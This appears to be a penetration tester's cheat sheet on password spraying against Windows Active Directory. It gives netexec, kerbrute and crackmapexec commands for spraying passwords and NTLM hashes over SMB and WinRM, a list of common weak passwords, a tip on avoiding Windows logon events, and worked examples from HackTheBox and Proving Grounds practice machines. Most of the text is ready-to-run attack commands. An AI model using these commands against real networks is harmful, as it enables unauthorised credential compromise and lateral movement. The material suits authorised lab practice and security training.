# Password Spraying

## Check Lockout Policy FIRST

```bash
nxc smb $DC -u user -p pass --pass-pol
```

- Account lockout threshold: **0 = no lockout = spray freely**
- Note lockout duration and observation window

---

## Spray Commands

```bash
# One password across all users
nxc smb $DC -u users.txt -p 'REDACTED' --continue-on-success
```

```bash
# Multiple passwords (user1:REDACTED, user2:REDACTED - no brute force)
nxc smb $DC -u users.txt -p REDACTED --no-bruteforce --continue-on-success
```

```bash
# Kerbrute (faster, doesn't create Windows logon events)
kerbrute passwordspray -d domain.local --dc $DC users.txt 'Password123'
```

---

## Common Passwords to Try

- `Season+Year` - Spring2024, Winter2024, Summer2025
- `Company+123` - Company123, Company1!
- `Password1`, `Welcome1`, `P@ssword1`
- `Month+Year` - March2024, January2025
- `Changeme1`, `Password123!`

---

## Tips

- Spray every new password you find across ALL machines
- Wait between attempts if lockout policy exists
- Use `--continue-on-success` to find password reuse
- Check both SMB and WinRM: `nxc winrm $IP_RANGE -u users.txt -p 'REDACTED'`

## From Your Boxes

> **Monteverde** (HTB) - Username-as-password spray for initial foothold
> - What worked: `nxc smb TARGET -u users.txt -p REDACTED --continue-on-success`
> - Found `SABatchJobs:REDACTED` - the username WAS the password
> - Lesson: Always spray usernames as passwords. Service/batch accounts often have lazy passwords

> **Flight** (HTB) - Password reuse spray across domain users
> - What worked: `nxc smb flight.htb -u users.txt -p 'REDACTED' --continue-on-success`
> - Found password reuse from svc_apache to another user, enabling lateral movement
> - Lesson: Every new password you find, spray it against ALL users immediately

> **Nagoya** (PG) - SMB brute force with rockyou against enumerated user list
> - What worked: `nxc smb TARGET -u names.txt -p REDACTED
> - Found `Fiona.Clark:REDACTED` which led to Kerberoasting and full compromise
> - Lesson: If no lockout policy, full rockyou spray against SMB can work on practice boxes

> **Resourced** (PG) - Hash spraying with NTDS dump
> - What worked: `crackmapexec smb TARGET -u usernames.txt -H hashes --continue-on-success`
> - After dumping NTDS.dit, sprayed all hashes to find which accounts had active sessions
> - Lesson: Spray hashes too, not just passwords - pass-the-hash spray finds valid combos fast

> **Hutch** (PG) - Single password spray across all LDAP-enumerated users
> - What worked: `nxc smb TARGET -u ~/users.txt -p 'REDACTED' -d hutch.offsec`
> - Lesson: Passwords found in LDAP attributes, config files, or descriptions - spray them against all users
